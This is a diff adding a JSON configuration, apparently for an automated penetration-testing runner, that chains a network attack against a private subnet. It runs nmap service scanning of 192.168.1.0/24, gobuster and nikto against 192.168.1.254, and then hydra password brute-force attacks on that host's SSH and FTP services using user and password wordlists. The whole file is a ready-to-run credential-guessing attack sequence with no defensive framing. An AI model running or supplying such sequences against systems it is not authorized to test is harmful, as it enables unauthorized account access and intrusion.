@@ -1,0 +1,26 @@
+
+{
+  "name": "Full Bruteforce Sequence",
+  "steps": [
+    {
+      "tool": "nmap",
+      "args": ["-sV", "192.168.1.0/24"]
+    },
+    {
+      "tool": "gobuster",
+      "args": ["dir", "-u", "http://192.168.1.254", "-w", "/usr/share/wordlists/dirb/big.txt"]
+    },
+    {
+      "tool": "nikto",
+      "args": ["-h", "http://192.168.1.254"]
+    },
+    {
+      "tool": "hydra",
+      "args": ["-L", "/usr/share/wordlists/users.txt", "-P", "/usr/share/wordlists/passwords.txt", "ssh://192.168.1.254"]
+    },
+    {
+      "tool": "hydra",
+      "args": ["-L", "/usr/share/wordlists/users.txt", "-P", "/usr/share/wordlists/passwords.txt", "ftp://192.168.1.254"]
+    }
+  ]
+}
